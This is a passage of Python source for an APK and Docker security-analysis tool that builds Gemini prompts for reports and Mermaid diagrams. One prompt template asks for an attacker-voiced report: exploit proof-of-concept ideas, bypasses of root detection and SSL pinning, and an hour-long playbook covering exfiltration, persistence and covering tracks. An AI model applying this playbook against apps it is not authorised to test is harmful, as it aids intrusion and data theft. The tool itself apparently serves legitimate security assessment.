REQUIRED SECTIONS:

<h3> Attack Summary</h3>
<p><strong>Hackability Score:</strong> [X/10] - How easy is this app to compromise?</p>
<p><strong>Most Dangerous Finding:</strong> [One-liner of the worst issue]</p>
<p><strong>Recommended Attack Path:</strong> [The attack chain I would use]</p>
<p><strong>Attacker Value:</strong> [What's worth stealing? User data? Credentials? Money?]</p>

<h3> Attack Surface Analysis</h3>
<h4>Entry Points (How I Get In)</h4>
<ul>
<li><strong>Exported Components:</strong> [Which activities/services can I call directly?]</li>
<li><strong>Deep Links:</strong> [Can I craft malicious URLs to trigger actions?]</li>
<li><strong>Content Providers:</strong> [Can I query/modify app data from another app?]</li>
<li><strong>Broadcast Receivers:</strong> [Can I send fake intents to trigger behavior?]</li>
<li><strong>Network APIs:</strong> [What endpoints can I attack?]</li>
<li><strong>WebViews:</strong> [Can I inject JavaScript?]</li>
</ul>

<h4>Sensitive Assets (What I Want)</h4>
<ul>
<li>[User credentials, tokens, personal data, financial info, etc.]</li>
<li>[Where is each asset stored? How is it protected?]</li>
</ul>

<h3> Critical Exploits</h3>
<p>Vulnerabilities I can exploit RIGHT NOW:</p>

<h4>Exploit 1: [Catchy Attack Name]</h4>
<ul>
<li><span style="color: #dc2626; font-weight: bold;">CRITICAL</span></li>
<li><strong>What:</strong> [Technical description]</li>
<li><strong>Where:</strong> <code>[File:Line or Component]</code></li>
<li><strong>Vulnerable Code:</strong> <pre><code>[The actual vulnerable code snippet]</code></pre></li>
<li><strong>Attack Scenario:</strong> [Step-by-step how I would exploit this]</li>
<li><strong>PoC Idea:</strong> <code>[Frida script / ADB command / malicious payload]</code></li>
<li><strong>Impact:</strong> [What I gain - RCE? Data theft? Account takeover?]</li>
<li><strong>Difficulty:</strong> [Easy/Medium/Hard] - [Why]</li>
</ul>

<h3> Attack Chains</h3>
<p>How I combine multiple weaknesses:</p>

<h4>Chain 1: [Attack Chain Name]</h4>
<ol>
<li><strong>Step 1:</strong> [First exploit/technique]</li>
<li><strong>Step 2:</strong> [Second exploit/technique]</li>
<li><strong>Step 3:</strong> [Final payload/goal]</li>
<li><strong>Result:</strong> [What attacker achieves]</li>
</ol>

<h3> Authentication Bypass Opportunities</h3>
<ul>
<li><strong>Token Weakness:</strong> [Can I forge/steal/reuse tokens?]</li>
<li><strong>Session Hijacking:</strong> [How would I steal a session?]</li>
<li><strong>Credential Extraction:</strong> [Where are creds stored? Can I get them?]</li>
<li><strong>Biometric Bypass:</strong> [Can I skip biometric auth?]</li>
</ul>

<h3> Secrets I Can Steal</h3>
<ul>
<li><strong>[Secret Type]:</strong> <code>[Location]</code>
  <ul>
  <li>Value hint: <code>[masked value or pattern]</code></li>
  <li>Exploitation: [How I'd extract and use this]</li>
  <li>Impact: [What access does this give me?]</li>
  </ul>
</li>
</ul>

<h3> Local Attack Vectors</h3>
<p>What a malicious app on the same device can do:</p>
<ul>
<li><strong>Data Theft:</strong> [Can another app read this app's data?]</li>
<li><strong>Intent Injection:</strong> [Can I trigger dangerous actions via intents?]</li>
<li><strong>Backup Extraction:</strong> [Can I get data via ADB backup?]</li>
<li><strong>Clipboard Snooping:</strong> [Does the app put sensitive data on clipboard?]</li>
<li><strong>Screenshot/Screen Recording:</strong> [Can I capture sensitive screens?]</li>
</ul>

<h3> Network Attack Vectors</h3>
<ul>
<li><strong>MITM Possibility:</strong> [Can I intercept traffic? How?]</li>
<li><strong>API Abuse:</strong> [What can I do with the API without proper auth?]</li>
<li><strong>SSL Pinning:</strong> [Is it implemented? Can I bypass it?]</li>
<li><strong>Request Tampering:</strong> [What happens if I modify requests?]</li>
</ul>

<h3> Injection Points</h3>
<ul>
<li><strong>SQL Injection:</strong> [Where? PoC query?]</li>
<li><strong>JavaScript Injection:</strong> [Which WebViews? PoC payload?]</li>
<li><strong>Path Traversal:</strong> [File operations I can abuse?]</li>
<li><strong>Command Injection:</strong> [Any exec/runtime calls?]</li>
</ul>

<h3> Frida Attack Scripts</h3>
<p>Hooks I would use to attack this app:</p>
<pre><code>// [Specific Frida script idea for key bypass/extraction]
Java.perform(function() {{
    // Hook description
}});
</code></pre>

<h3> Vulnerable Dependencies</h3>
<ul>
<li><strong>[Library Name] v[X.X]:</strong> [CVE-XXXX-XXXX]
  <ul>
  <li>Exploitability: [Can I actually exploit this in context?]</li>
  <li>Attack: [How would I leverage this CVE?]</li>
  </ul>
</li>
</ul>

<h3> High-Value Targets (Not Yet Exploitable)</h3>
<p>Interesting code that needs more analysis:</p>
<ul>
<li>[Suspicious patterns that might be exploitable with more research]</li>
</ul>

<h3> Defenses I Need to Bypass</h3>
<ul>
<li><strong>Root Detection:</strong> [Present? How to bypass?]</li>
<li><strong>Emulator Detection:</strong> [Present? How to bypass?]</li>
<li><strong>Tamper Detection:</strong> [Present? How to bypass?]</li>
<li><strong>SSL Pinning:</strong> [Implementation? Bypass difficulty?]</li>
<li><strong>Code Obfuscation:</strong> [Level? Impact on analysis?]</li>
</ul>

<h3> Attack Playbook</h3>
<p>If I had 1 hour to hack this app, I would:</p>
<ol>
<li><strong>[First 15 min]:</strong> [Initial access technique]</li>
<li><strong>[Next 15 min]:</strong> [Privilege escalation / data access]</li>
<li><strong>[Next 15 min]:</strong> [Data exfiltration / persistence]</li>
<li><strong>[Final 15 min]:</strong> [Cover tracks / maximize impact]</li>
</ol>

<h3> Bug Bounty Targets</h3>
<p>If this app had a bug bounty, I'd focus on:</p>
<ol>
<li>[Highest-paying vulnerability class] - [Why it's present here]</li>
<li>[Second target] - [Why]</li>
<li>[Third target] - [Why]</li>
</ol>

## CRITICAL: REAL EXPLOITS ONLY
- Only report vulnerabilities you could ACTUALLY EXPLOIT
- Provide SPECIFIC attack scenarios, not theoretical risks
- Include PROOF-OF-CONCEPT ideas (Frida hooks, ADB commands, payloads)
- Rate by EXPLOITABILITY (Easy/Medium/Hard), not just CVSS
- Skip compliance issues that aren't really attackable
- If you see defense mechanisms, explain how to BYPASS them
Focus on REAL, EXPLOITABLE issues that would affect users.

BE EXHAUSTIVE but ACCURATE. Analyze EVERY class provided. Report ALL REAL vulnerabilities found. Reference specific code locations."""

        # Generate both reports with retry logic
        async def get_functionality_report():
            return await gemini_request_with_retry(
                lambda: client.aio.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=functionality_prompt)])],
                ),
                max_retries=3,
                base_delay=2.0,
                timeout_seconds=120.0,
                operation_name="APK functionality report"
            )
        
        async def get_security_report():
            return await gemini_request_with_retry(
                lambda: client.aio.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=security_prompt)])],
                ),
                max_retries=3,
                base_delay=2.0,
                timeout_seconds=120.0,
                operation_name="APK security report"
            )
        
        # Generate both reports in parallel with error handling
        try:
            functionality_response, security_response = await asyncio.gather(
                get_functionality_report(),
                get_security_report(),
                return_exceptions=True  # Don't fail if one report fails
            )
        except Exception as e:
            logger.error(f"APK AI reports parallel execution failed: {e}")
            functionality_response, security_response = None, None
        
        # Extract text from responses, handling errors
        functionality_report = None
        security_report = None
        
        if functionality_response and not isinstance(functionality_response, Exception):
            functionality_report = functionality_response.text if functionality_response else None
        elif isinstance(functionality_response, Exception):
            logger.warning(f"Functionality report failed: {functionality_response}")
            
        if security_response and not isinstance(security_response, Exception):
            security_report = security_response.text if security_response else None
        elif isinstance(security_response, Exception):
            logger.warning(f"Security report failed: {security_response}")
        
        # Clean up any markdown code block wrappers
        if functionality_report:
            functionality_report = functionality_report.strip()
            if functionality_report.startswith("```html"):
                functionality_report = functionality_report[7:]
            if functionality_report.startswith("```"):
                functionality_report = functionality_report[3:]
            if functionality_report.endswith("```"):
                functionality_report = functionality_report[:-3]
            functionality_report = functionality_report.strip()
            
        if security_report:
            security_report = security_report.strip()
            if security_report.startswith("```html"):
                security_report = security_report[7:]
            if security_report.startswith("```"):
                security_report = security_report[3:]
            if security_report.endswith("```"):
                security_report = security_report[:-3]
            security_report = security_report.strip()
        
        # ==================== PASS 3: VALIDATION PASS (Multi-pass AI) ====================
        # This pass validates the initial findings to reduce false positives
        if security_report and len(security_report) > 500:
            logger.info("AI Reports: Running validation pass to reduce false positives...")
            
            # Get extracted methods for validation context
            extracted_methods_context = ""
            extracted_methods = full_scan_data.get("extracted_methods", [])
            if extracted_methods:
                extracted_methods_context = "\n\n=== SECURITY-RELEVANT METHOD IMPLEMENTATIONS ===\n"
                for m in extracted_methods[:30]:  # Top 30 methods
                    extracted_methods_context += f"\n**{m['class']}.{m['method_name']}() [{m['category']}]:**\n"
                    code = m['code'][:1000] if len(m['code']) > 1000 else m['code']
                    extracted_methods_context += f"```java\n{code}\n```\n"
            
            validation_prompt = f"""You are a senior security auditor reviewing a junior analyst's security report. Your job is to VALIDATE the findings and REMOVE FALSE POSITIVES.

## ORIGINAL SECURITY REPORT TO VALIDATE:
{security_report[:30000]}

## ACTUAL SOURCE CODE FOR VERIFICATION:
{extracted_methods_context}

{source_code_context[:50000]}

## YOUR TASK:
1. Review EACH vulnerability in the report
2. Check if the vulnerability is REAL by looking at the actual code
3. REMOVE findings that are:
   - In test/mock/example code
   - In comments or documentation
   - In third-party libraries
   - Misidentified patterns (e.g., MD5 for caching, not passwords)
   - Debug-only code paths
   - Properly implemented code incorrectly flagged
   
4. KEEP findings that are:
   - Verified by actual vulnerable code patterns
   - Have clear exploitation paths
   - Would affect real users

5. ADJUST severity if needed:
   - If a "CRITICAL" finding is actually low-risk, downgrade it
   - If something marked "LOW" is actually exploitable, upgrade it

## OUTPUT FORMAT:
Return the SAME HTML format as the original report, but:
- Remove false positive sections entirely
- Add "[VALIDATED]" before real vulnerability titles
- Adjust severity badges as needed
- Add a new section at the top:

<h3> Validation Summary</h3>
<p><strong>Original Findings:</strong> [X] critical, [Y] high, [Z] medium</p>
<p><strong>After Validation:</strong> [A] critical, [B] high, [C] medium</p>
<p><strong>Removed as False Positives:</strong> [N]</p>
<p><strong>Confidence Level:</strong> High - findings verified against source code</p>

Return the complete validated HTML report."""

            try:
                validation_response = await gemini_request_with_retry(
                    lambda: client.aio.models.generate_content(
                        model=settings.gemini_model_id,
                        contents=[types.Content(role="user", parts=[types.Part(text=validation_prompt)])],
                    ),
                    max_retries=2,
                    base_delay=2.0,
                    timeout_seconds=90.0,
                    operation_name="Security validation pass"
                )
                
                if validation_response and validation_response.text:
                    validated_report = validation_response.text.strip()
                    if validated_report.startswith("```html"):
                        validated_report = validated_report[7:]
                    if validated_report.startswith("```"):
                        validated_report = validated_report[3:]
                    if validated_report.endswith("```"):
                        validated_report = validated_report[:-3]
                    validated_report = validated_report.strip()
                    
                    # Only use validated report if it's substantial
                    if len(validated_report) > 500:
                        security_report = validated_report
                        logger.info("AI Reports: Validation pass completed, using refined report")
                    
            except Exception as ve:
                logger.warning(f"Validation pass failed, using original report: {ve}")
        
        # ==================== REPORT 3: Code Architecture Diagram ====================
        logger.info("AI Reports: Generating architecture diagram...")
        architecture_diagram = None
        
        architecture_prompt = f"""You are a software architect creating a code architecture diagram for an Android app.

## APP INFORMATION
Package: {result.package_name}
App Name: {result.app_name or 'Unknown'}

## APP COMPONENTS
Activities ({len(result.activities)}): {', '.join(result.activities[:20])}
Services ({len(result.services)}): {', '.join(result.services[:15])}
Receivers ({len(result.receivers)}): {', '.join(result.receivers[:10])}
Providers ({len(result.providers)}): {', '.join(result.providers[:10])}

## DETECTED FEATURES
{', '.join(all_features)}

## CLASS INTERACTIONS FROM CROSS-REFERENCE ANALYSIS
{chr(10).join(f"{i['from']} --> {i['to']}" for i in cross_ref_data.get('component_interactions', [])[:40])}

## CLASS HIERARCHY
Inheritance:
{chr(10).join(f"{child} extends {parent}" for child, parent in list(cross_ref_data.get('class_hierarchy', {}).get('inheritance', {}).items())[:25])}

Interfaces:
{chr(10).join(f"{cls} implements {', '.join(ifaces)}" for cls, ifaces in list(cross_ref_data.get('class_hierarchy', {}).get('implementations', {}).items())[:20])}

## NATIVE LIBRARIES
{', '.join(result.native_libraries[:10]) if result.native_libraries else 'None'}

## YOUR TASK
Create a Mermaid diagram showing the app's architecture. Show:
1. Main layers (UI, Business Logic, Data, Network)
2. Key classes and their relationships
3. Data flow between components
4. External service connections

Output a valid Mermaid flowchart diagram. Use subgraphs for different layers.

IMPORTANT: Output ONLY the Mermaid code, no explanations. Start with ```mermaid and end with ```.

Example structure:
```mermaid
flowchart TB
    subgraph UI["UI Layer"]
        MainActivity
        LoginActivity
    end
    subgraph BL["Business Logic"]
        AuthManager
        DataRepository
    end
    subgraph Data["Data Layer"]
        Database
        SharedPrefs
    end
    subgraph Network["Network"]
        ApiClient
        RetrofitService
    end
    
    MainActivity --> AuthManager
    LoginActivity --> AuthManager
    AuthManager --> ApiClient
    DataRepository --> Database
```

Generate a diagram for THIS app based on the actual code structure provided."""

        try:
            arch_response = await gemini_request_with_retry(
                lambda: client.aio.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=architecture_prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=60.0,
                operation_name="Architecture diagram"
            )
            
            if arch_response and arch_response.text:
                architecture_diagram = arch_response.text.strip()
                # Extract just the mermaid code
                if "```mermaid" in architecture_diagram:
                    start = architecture_diagram.find("```mermaid")
                    end = architecture_diagram.find("```", start + 10)
                    if end > start:
                        architecture_diagram = architecture_diagram[start:end + 3]
                logger.info("AI Reports: Architecture diagram generated")
        except Exception as e:
            logger.warning(f"Architecture diagram generation failed: {e}")
        
        # ==================== REPORT 4: Attack Surface Map (Mermaid) ====================
        logger.info("AI Reports: Generating attack surface map...")
        attack_surface_map = None
        
        attack_surface_prompt = f"""You are a penetration tester mapping the attack surface of an Android application as a visual diagram.

## APP INFORMATION
Package: {result.package_name}
Debuggable: {result.debuggable}
Allow Backup: {result.allow_backup}

## ENTRY POINTS
Exported Activities: {len([a for a in result.activities if 'export' in str(a).lower()])}
Activities: {', '.join(result.activities[:15])}

Exported Services: {len(result.services)}
Services: {', '.join(result.services[:10])}

Broadcast Receivers: {', '.join(result.receivers[:10])}
Content Providers: {', '.join(result.providers[:10])}

## PERMISSIONS (Attack Vectors)
Dangerous Permissions:
{chr(10).join(f"- {p.name}" for p in [p for p in result.permissions if p.is_dangerous][:15])}

## NETWORK SURFACE
API Endpoints Found:
{chr(10).join(all_api_endpoints[:20])}

External URLs:
{chr(10).join(suspicious_urls[:15])}

## NATIVE CODE
Libraries: {', '.join(result.native_libraries[:8]) if result.native_libraries else 'None'}

## DATA STORAGE
Sensitive Data Fields:
{chr(10).join(f"- [{f['risk']}] {f['data_type']}: {f['field']}" for f in cross_ref_data.get('data_flows', [])[:15])}

## SECURITY FINDINGS FROM SCAN
{chr(10).join(f"- {issue['class']}: {issue['issue']}" for issue in parallel_scan_data.get('aggregated', {}).get('security_issues', [])[:20])}

## KNOWN CVEs IN DEPENDENCIES
{f"Critical/High CVEs: {cve_data['stats'].get('critical_cves', 0)} critical, {cve_data['stats'].get('high_cves', 0)} high" if cve_data.get('cves') else "No CVEs found"}
{chr(10).join(f"- {cve.get('cve_id', 'Unknown')} ({cve.get('severity', 'N/A')}) in {cve.get('library', 'Unknown')}" for cve in cve_data.get('cves', [])[:10]) if cve_data.get('cves') else ""}

## YOUR TASK
Create a Mermaid diagram showing the complete attack surface map.

Use a flowchart that shows:
1. ATTACKER node at the top (external threat)
2. Entry Points grouped by type (Activities, Services, Receivers, Providers, DeepLinks)
3. Attack vectors (Network, Storage, Native Code)
4. Sensitive data/assets at risk
5. Color-code by risk level using styles

Output ONLY valid Mermaid code. Start with ```mermaid and end with ```.

Example structure:
```mermaid
flowchart TB
    subgraph Attacker[" ATTACKER"]
        ATK[External Threat]
    end
    
    subgraph EntryPoints[" ENTRY POINTS"]
        subgraph Activities["Activities"]
            MA[MainActivity]
            LA[LoginActivity]
        end
        subgraph Services["Services"]
            AS[ApiService]
        end
        subgraph Receivers["Broadcast Receivers"]
            BR[PushReceiver]
        end
        subgraph DeepLinks["Deep Links"]
            DL[app://open]
        end
    end
    
    subgraph Network[" NETWORK SURFACE"]
        API["/api/v1/users"]
        API2["/api/v1/auth"]
        EXT[External: firebase.io]
    end
    
    subgraph Storage[" DATA STORAGE"]
        DB[(SQLite DB)]
        SP[SharedPrefs]
        FS[Files]
    end
    
    subgraph Native[" NATIVE CODE"]
        LIB[libnative.so]
        JNI[JNI Bridge]
    end
    
    subgraph Assets[" SENSITIVE DATA"]
        CRED[Credentials]
        TOKEN[Auth Tokens]
        PII[User PII]
        PAY[Payment Data]
    end
    
    ATK --> MA
    ATK --> LA
    ATK --> DL
    ATK --> API
    ATK --> BR
    
    MA --> DB
    LA --> API
    LA --> CRED
    API --> TOKEN
    AS --> EXT
    
    DB --> PII
    SP --> TOKEN
    LIB --> JNI
    JNI --> CRED
    
    %% Risk styling
    classDef critical fill:#dc2626,color:#fff
    classDef high fill:#ea580c,color:#fff
    classDef medium fill:#ca8a04,color:#000
    classDef low fill:#16a34a,color:#fff
    classDef attacker fill:#7c3aed,color:#fff
    
    class ATK attacker
    class CRED,TOKEN,PAY critical
    class API,API2,DB high
    class SP,BR medium
    class FS,LIB low
```

Generate a comprehensive attack surface diagram for THIS app based on the actual components and data provided. Show ALL major entry points and how they connect to sensitive assets."""

        try:
            attack_response = await gemini_request_with_retry(
                lambda: client.aio.models.generate_content(
                    model=settings.gemini_model_id,
                    contents=[types.Content(role="user", parts=[types.Part(text=attack_surface_prompt)])],
                ),
                max_retries=2,
                base_delay=2.0,
                timeout_seconds=90.0,
                operation_name="Attack surface map"
            )
            
            if attack_response and attack_response.text:
                attack_surface_map = attack_response.text.strip()
                # Extract just the mermaid code
                if "```mermaid" in attack_surface_map:
                    start = attack_surface_map.find("```mermaid")
                    end = attack_surface_map.find("```", start + 10)
                    if end > start:
                        attack_surface_map = attack_surface_map[start:end + 3]
                attack_surface_map = attack_surface_map.strip()
                logger.info("AI Reports: Attack surface map generated")
        except Exception as e:
            logger.warning(f"Attack surface map generation failed: {e}")
        
        # Combine for legacy support
        legacy_report = f"""== WHAT DOES THIS APK DO ==

{functionality_report or 'Analysis unavailable'}

== SECURITY FINDINGS ==

{security_report or 'Analysis unavailable'}
"""
        
        return ApkAIReports(
            functionality_report=functionality_report,
            security_report=security_report,
            architecture_diagram=architecture_diagram,
            attack_surface_map=attack_surface_map,
            legacy_report=legacy_report
        )
        
    except Exception as e:
        logger.error(f"AI analysis failed: {e}")
        return None


async def analyze_docker_with_ai(
    result: DockerLayerAnalysisResult,
    base_image_intel: Optional[List[Dict[str, Any]]] = None,
    layer_secrets: Optional[List[Dict[str, Any]]] = None,
    layer_scan_metadata: Optional[Dict[str, Any]] = None,
) -> Optional[str]:
    """Use Gemini to provide comprehensive security analysis of Docker image."""
    if not settings.gemini_api_key:
        return None
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)

        base_image_intel = base_image_intel or []
        layer_secrets = layer_secrets or []
        layer_scan_metadata = layer_scan_metadata or {}
        
        # Group secrets by type
        secrets_by_type = {}
        for s in result.secrets:
            st = s.secret_type
            if st not in secrets_by_type:
                secrets_by_type[st] = []
            secrets_by_type[st].append(s)
        
        secrets_summary = "\n".join([
            f"- **{stype}** ({len(secrets)}): {', '.join(s.masked_value for s in secrets[:3])}"
            for stype, secrets in secrets_by_type.items()
        ])
        
        # Layer commands analysis
        layer_commands = "\n".join([
            f"- Layer {i+1} ({layer.get('id', 'unknown')}): {layer.get('command', '')[:100]}"
            for i, layer in enumerate(result.layers[:10]) if layer.get('command')
        ])

        # Base image intelligence summary
        base_intel_summary = "\n".join([
            f"- [{i.get('severity', 'unknown').upper()}] {i.get('category', 'unknown')}: {i.get('message', '')}"
            + (f" (rec: {i.get('recommendation')})" if i.get('recommendation') else "")
            for i in base_image_intel[:10]
        ])

        # Layer deep scan summary
        deleted_layer_secrets = [s for s in layer_secrets if s.get("is_deleted")]
        layer_secrets_summary = "\n".join([
            f"- Layer {s.get('layer_index', '?')}: {s.get('file_path', 'unknown')} ({s.get('file_type', 'unknown')}, {s.get('severity', 'unknown')})"
            for s in layer_secrets[:10]
        ])
        layer_scan_stats = None
        if layer_scan_metadata:
            layer_scan_stats = (
                f"Layers scanned: {layer_scan_metadata.get('layers_scanned', 'N/A')}, "
                f"Files scanned: {layer_scan_metadata.get('files_scanned', 'N/A')}, "
                f"Deleted secrets: {layer_scan_metadata.get('deleted_secrets_found', 0)}"
            )
        
        prompt = f"""You are a container security analyst. Analyze this Docker image and provide a comprehensive security assessment.

## IMAGE INFORMATION
- **Name:** {result.image_name}
- **ID:** {result.image_id}
- **Layers:** {result.total_layers}
- **Total Size:** {result.total_size / (1024*1024):.1f} MB
- **Base Image:** {result.base_image or "Unknown"}

## LAYER COMMANDS (build history)
{layer_commands or "No layer history available"}

## SECRETS FOUND ({len(result.secrets)})
{secrets_summary or "None detected"}

**Detailed Secret Locations:**
{chr(10).join(f'- {s.secret_type} in layer {s.layer_id}: {s.masked_value}' for s in result.secrets[:10]) or "None"}

## SECURITY ISSUES ({len(result.security_issues)})
{chr(10).join(f'- [{i.get("severity", "INFO").upper()}] {i["category"]}: {i["description"]}' for i in result.security_issues[:15]) or "None"}

## BASE IMAGE INTELLIGENCE ({len(base_image_intel)})
{base_intel_summary or "None"}

## LAYER DEEP SCAN ({len(layer_secrets)})
- Deleted but recoverable: {len(deleted_layer_secrets)}
- Scan stats: {layer_scan_stats or "N/A"}
{layer_secrets_summary or "None"}

## ANALYSIS INSTRUCTIONS
Provide your analysis in the following structured format:

**RISK ASSESSMENT**
- Risk Level: [Critical/High/Medium/Low/Clean]
- Risk Score: [0-100]
- Confidence: [High/Medium/Low]

**EXECUTIVE SUMMARY**
[2-3 sentence summary of findings]

**SECRET EXPOSURE ANALYSIS**
[Analysis of exposed secrets, their impact, and which layers contain them]

**SUPPLY CHAIN CONCERNS**
[Analysis of base image, dependencies, and supply chain risks]

**KEY SECURITY FINDINGS**
1. [Finding with severity and details]
2. [Continue for significant findings]

**CONTAINER HARDENING RECOMMENDATIONS**
1. [Specific Dockerfile improvements]
2. [Runtime security recommendations]
3. [Secret management recommendations]

**REMEDIATION STEPS**
1. [Step to remove/rotate exposed secrets]
2. [Steps to rebuild image securely]

Be thorough but actionable. Focus on practical remediation."""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Docker layer AI analysis"
        )
        
        if response is None:
            return "AI analysis unavailable: All retry attempts failed"
        
        return response.text
        
    except Exception as e:
        logger.error(f"AI analysis failed: {e}")
        return f"AI analysis unavailable: {str(e)}"


# ============================================================================
# AI-Generated Mermaid Architecture Diagrams
# ============================================================================

async def generate_ai_architecture_diagram(
    result: ApkAnalysisResult,
    jadx_result: Optional[Dict[str, Any]] = None,
    output_dir: Optional[Path] = None
) -> Optional[str]:
    """
    Generate an AI-powered Mermaid architecture diagram after APK analysis.
    
    Uses Gemini to create a comprehensive architecture visualization with icons.
    
    Args:
        result: The APK analysis result
        jadx_result: Optional JADX decompilation result dict (from get_jadx_result_summary)
        output_dir: Optional JADX output directory for accessing source code directly
    
    Returns:
        Mermaid diagram code string, or None if generation fails
    """
    if not settings.gemini_api_key:
        return None
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # PHASE 1: Full codebase scan for comprehensive coverage
        full_scan_data = {"full_scan_context": "", "stats": {}}
        if output_dir and Path(output_dir).exists():
            logger.info("Architecture Diagram: Scanning ALL source files...")
            full_scan_data = _scan_all_files_for_ai_context(Path(output_dir))
        
        full_scan_context = full_scan_data.get("full_scan_context", "")
        all_features = full_scan_data.get("detected_features", [])
        all_endpoints = full_scan_data.get("api_endpoints", [])
        full_scan_stats = full_scan_data.get("stats", {})
        
        # PHASE 2: Detailed code samples for key classes
        source_context_data = {"code_context": "", "features": [], "endpoints": [], "stats": {}}
        if output_dir and Path(output_dir).exists():
            source_context_data = _collect_comprehensive_source_context(Path(output_dir), max_classes=50)
        
        source_code_context = source_context_data.get("code_context", "")
        detected_features = source_context_data.get("features", [])
        detected_endpoints = source_context_data.get("endpoints", [])
        source_stats = source_context_data.get("stats", {})
        
        # Merge features and endpoints from both scans
        all_features = list(set(all_features + detected_features))
        all_endpoints = list(set(all_endpoints + detected_endpoints))
        
        # Build context about the app with comprehensive info
        components_context = f"""
=== APP IDENTITY ===
Package: {result.package_name}
App Name: {result.app_name or 'Unknown'}
Version: {result.version_name} (code: {result.version_code})
Min SDK: {result.min_sdk} | Target SDK: {result.target_sdk}

=== APP COMPONENTS ===
Activities ({len(result.activities)}):
{chr(10).join(f'  - {a}' for a in result.activities[:20]) or '  None'}

Services ({len(result.services)}):
{chr(10).join(f'  - {s}' for s in result.services[:15]) or '  None'}

Broadcast Receivers ({len(result.receivers)}):
{chr(10).join(f'  - {r}' for r in result.receivers[:10]) or '  None'}

Content Providers ({len(result.providers)}):
{chr(10).join(f'  - {p}' for p in result.providers[:10]) or '  None'}

=== COMPREHENSIVE CODE ANALYSIS ===
Total Classes in App: {full_scan_stats.get('total_classes', source_stats.get('total_classes', 'N/A'))}
Classes Scanned: {full_scan_stats.get('scanned_classes', source_stats.get('analyzed_classes', 'N/A'))}
Security Patterns Found: {full_scan_stats.get('security_patterns_found', 0)}

=== DETECTED FEATURE CATEGORIES (from code analysis) ===
{', '.join(all_features) if all_features else 'Not analyzed'}

=== API ENDPOINTS FOUND IN CODE ===
{chr(10).join(f'  - {e}' for e in all_endpoints[:25]) if all_endpoints else '  None detected'}

=== NATIVE LIBRARIES ===
{', '.join(result.native_libraries[:15]) if result.native_libraries else 'None'}

=== FULL CODEBASE SCAN ===
{full_scan_context}

=== DETAILED CODE SAMPLES ===
{source_code_context}
"""
        
        # Add decompilation insights if available (dict format from get_jadx_result_summary)
        decompile_context = ""
        if jadx_result and isinstance(jadx_result, dict):
            classes = jadx_result.get('classes', [])
            key_classes = [c for c in classes[:50] if c.get('is_activity') or c.get('is_service') or c.get('is_receiver') or c.get('is_provider')]
            if key_classes:
                decompile_context = f"""
=== KEY COMPONENT CLASSES ===
{chr(10).join(f"- {c.get('class_name', 'Unknown')} ({'Activity' if c.get('is_activity') else 'Service' if c.get('is_service') else 'Receiver' if c.get('is_receiver') else 'Provider'})" for c in key_classes[:25])}
"""
            # Add sample code context for better AI understanding
            sample_code = jadx_result.get('sample_code', [])
            if sample_code:
                decompile_context += f"""
=== ADDITIONAL CODE SAMPLES ===
"""
                for sample in sample_code[:5]:  # Increased from 3
                    decompile_context += f"""
--- {sample.get('class_name', 'Unknown')} ({sample.get('type', 'class')}) ---
{sample.get('code_snippet', '')[:2000]}
"""
        
        # Enhanced security context
        dangerous_perms = [p for p in result.permissions if p.is_dangerous]
        security_context = f"""
=== SECURITY OVERVIEW ===
Security Issues Found: {len(result.security_issues)}
Dangerous Permissions: {len(dangerous_perms)}
Secrets/Keys Found: {len(result.secrets)}
Debuggable: {result.debuggable}
Allows Backup: {result.allow_backup}

Dangerous Permission List:
{chr(10).join(f'  - {p.name}' for p in dangerous_perms[:15]) or '  None'}

Top Security Issues:
{chr(10).join(f'  - [{i.get("severity", "INFO").upper()}] {i["category"]}: {i["description"][:80]}' for i in result.security_issues[:10]) or '  None'}
"""
        
        # Enhanced network context
        suspicious_urls = [u for u in result.urls if not any(safe in u.lower() for safe in ('google.com', 'android.com', 'googleapis.com', 'gstatic.com', 'schema.org'))]
        network_context = f"""
=== NETWORK & EXTERNAL SERVICES ===
Total URLs Found: {len(result.urls)}
Notable URLs (non-standard):
{chr(10).join(f'  - {u}' for u in suspicious_urls[:15]) or '  None'}
"""
        
        # Data flow context if available
        data_flow_context = ""
        if result.data_flow_analysis:
            dfa = result.data_flow_analysis
            data_flow_context = f"""
=== DATA FLOW ANALYSIS ===
Sensitive Data Sources: {dfa.get('total_sources', 0)}
Data Sinks (exit points): {dfa.get('total_sinks', 0)}
Data Flow Paths: {dfa.get('total_flows', 0)}
Critical Flows: {dfa.get('critical_flows', 0)}
High-Risk Flows: {dfa.get('high_risk_flows', 0)}

Top Data Flows:
{chr(10).join(f'  - {p.get("source", {}).get("source_type", "?")}  {p.get("sink", {}).get("sink_type", "?")}' for p in dfa.get('data_flow_paths', [])[:8] if isinstance(p, dict)) or '  None'}
"""

        # Build comprehensive prompt with all context
        full_context = f"""{components_context}
{decompile_context}
{security_context}
{network_context}
{data_flow_context}
"""

        prompt = f"""You are an expert Android app architecture analyst performing DEEP CODE ANALYSIS. Generate a COMPREHENSIVE, ACCURATE architecture diagram based on the ACTUAL CODE you are provided.

## COMPLETE APP DATA (INCLUDING SOURCE CODE)
{full_context}

## YOUR TASK
Analyze ALL the provided source code and metadata to create an ACCURATE architecture diagram that reflects:
1. The ACTUAL class structure and relationships found in the code
2. REAL API endpoints and network calls from the code
3. ACTUAL third-party services detected (Firebase, Analytics, Payment SDKs, etc.)
4. REAL data flows between components based on code analysis
5. Authentication and security architecture based on the code

## DIAGRAM REQUIREMENTS
Create a diagram that shows:
1. **Entry Points** - Main activities, launcher screens, deep links
2. **UI Layer** - Activities, Fragments, ViewModels based on actual class names
3. **Business Logic** - Services, Managers, Use Cases, Repositories
4. **Data Layer** - DAOs, Databases, SharedPreferences, Caches
5. **Network Layer** - API clients, Retrofit services, actual endpoints
6. **External Services** - Firebase, analytics, payment gateways, push notifications
7. **Security Components** - Auth managers, token handlers, encryption utilities

Use the ACTUAL class names you see in the code (shortened if needed).

## MERMAID ICON SYNTAX
